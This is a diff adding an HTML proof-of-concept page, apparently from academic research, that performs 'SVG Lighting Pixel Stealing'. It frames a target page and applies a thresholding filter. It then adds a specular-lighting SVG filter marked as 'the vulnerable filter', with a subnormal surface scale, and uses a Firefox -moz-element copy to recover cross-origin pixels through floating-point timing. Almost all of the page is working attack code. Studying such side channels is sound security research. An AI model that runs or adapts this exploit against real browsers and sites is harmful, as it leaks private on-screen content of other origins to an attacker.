@@ -1,0 +1,151 @@
+
+<!DOCTYPE html>
+<html>
+
+  <head>
+    <title>SVG Lighting Pixel Stealing</title>
+    <style>
+html, body {
+  width: 100%;
+  height: 100%;
+  margin: 0;
+  padding: 0;
+}
+        .back {
+          position: absolute;
+          left: 0;
+          right: 0;
+          top: 0;
+          bottom: 0;
+          z-index: 0;
+        }
+        .front {
+          position: absolute;
+          left: 0;
+          right: 0;
+          top: 0;
+          bottom: 0;
+          z-index: 1;
+          background-color: white;
+          opacity: 0.99;
+        }
+        #frame {
+          height: 800px;
+          width: 800px;
+          filter: url(#threshold);
+        }
+        #copy {
+          height: 800px;
+          width: 800px;
+          background: -moz-element(#frame);
+        }
+        #scroll {
+          height: 1px;
+          width: 1px;
+          overflow: hidden;
+        }
+        #pixel {
+        }
+        .dup {
+          width: 600px;
+          height: 200px;
+        }
+        .pixel {
+          background: -moz-element(#scroll);
+        }
+        .white {
+          background: white;
+        }
+        .black {
+          background: black;
+        }
+        .timing {
+          filter: url(#timing);
+        }
+        #status{
+          color: red;
+          font-family: monospace;
+          font-size:30px
+        }
+        #framemirror{
+          height: 768px;
+          width: 1024px;
+          filter:url{#threshold}
+        }
+
+    </style>
+  </head>
+
+  <script src="float.js"></script>
+
+  <body>
+
+    <div class="back">
+      <iframe id="frame" frameborder="0" scrolling="no" src="about:blank"></iframe>
+      <div id="scroll"><div id="copy"></div></div>
+      <svg>
+        <!-- Color thresholding filters, force the image to black/white only -->
+        <filter id="threshold">
+        <feColorMatrix type="matrix" values="0.33 0.33 0.33 0 0
+        0.33 0.33 0.33 0 0
+        0.33 0.33 0.33 0 0
+        0    0    0    0 1" />
+        <feComponentTransfer>
+        <feFuncR type="discrete" tableValues="1 0" />
+        <feFuncG type="discrete" tableValues="1 0" />
+        <feFuncB type="discrete" tableValues="1 0" />
+        </feComponentTransfer>
+        </filter>
+      </svg>
+      <svg height="0">
+        <!-- *** This is the vulnerable filter *** -->
+        <filter id="timing">
+        <feColorMatrix type="matrix" values="0 0 0  0 0
+        0 0 0  0 0
+        0 0 0  0 0
+        1 1 1  0 0" />
+
+        </filter>
+      </svg>
+    </div>
+    <!-- <div class="back"> -->
+
+    <!--  </div> -->
+    <div class="front">
+
+      <div id="status" hidden>Starting...</div>
+      <input id="url" type="text" value="https://cseweb.ucsd.edu/~dkohlbre/floats/48px_wb_cb.html" hidden/><br/>
+      <input id="size" type="text" value="500" hidden/><br/>
+      <button onclick="run();">Run</button> <button onclick="halt();" hidden>Halt</button></br>
+      Reference:<div id="mirrorlock" style="width:48px; height:48px; overflow:hidden;border-style:solid;border-color:red;"> 
+        <iframe id="framemirror" position="absolute" frameborder="0" scrolling="no" src="48px_wb_cb.html"></iframe>
+      </div>
+      Result:<div style="width:48px;height:48px;border-style:solid;border-color:green"><canvas id="canvas" width="48" height="48"></canvas></div>
+      <br/>
+      <div id="pixel"></div>
+      <div id="debug"></div>
+    </div>
+
+  </body>
+
+  <script>
+var filter = document.getElementById("timing");
+
+var dlight = document.createElementNS(NS,"feSpecularLighting");
+dlight.setAttribute("result","light");
+dlight.setAttribute("lighting-color","white");
+
+dlight.setAttribute("surfaceScale","1e-44");
+var light = document.createElementNS(NS,"fePointLight");
+light.setAttribute("x","30222");
+light.setAttribute("y","1022");
+light.setAttribute("z","2022");
+dlight.appendChild(light);
+filter.appendChild(dlight);
+document.getElementById("status").innerHTML = "Ready!";
+
+  </script>
+
+
+</html>
+
